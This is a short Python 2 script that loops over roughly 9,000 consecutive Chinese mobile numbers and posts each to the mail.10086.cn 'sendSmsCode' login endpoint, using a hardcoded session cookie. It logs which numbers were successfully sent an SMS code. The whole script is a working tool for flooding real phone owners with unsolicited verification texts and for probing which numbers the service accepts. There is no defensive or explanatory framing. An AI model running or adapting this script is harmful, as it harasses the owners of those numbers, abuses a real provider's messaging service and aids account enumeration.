import requests
import json
from lxml import etree


url = 'http://mail.10086.cn/s?func=login:sendSmsCode&cguid=1433267646466&randnum=0.8624409555512317'

head = {
		'Host':'mail.10086.cn',
		'User-Agent':'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:46.0) Gecko/20100101 Firefox/46.0',
		'Accept':'text/javascript',
		'Accept-Language':'en-US,en;q=0.5',
		'Accept-Encoding':'gzip, deflate',
		'Content-Type':'application/xml',
		'Referer':'http://mail.10086.cn',
		'Content-Length':'162',
		'Cookie':'JSESSIONID=70533AF51EB07CCE79DB5A0AA41C7A00',
		'Connection':'keep-alive'
	}

def get_data():
	data_list = []
	for number in range(18898761000,18898769999):
		data = '<object><string name="loginName">'+str(number)+'</string><string name="fv">4</string><string name="clientId">1003</string><string name="version">1.0</string></object>'
		data_list.append(data)
	return data_list

def request_post(data_list):
	tmp='//*/string[1]/text()'
	for data in data_list:
		req = requests.post(url,headers=head,data=data)
		obj = etree.HTML(data)
		result_dict = json.loads(req.text)
		if result_dict[u'summary'] == u'successed to process!':
			print "number:%s send sms successed!" % obj.xpath(tmp)[0]
		

if __name__ == '__main__':
	data_list = get_data()
	request_post(data_list)
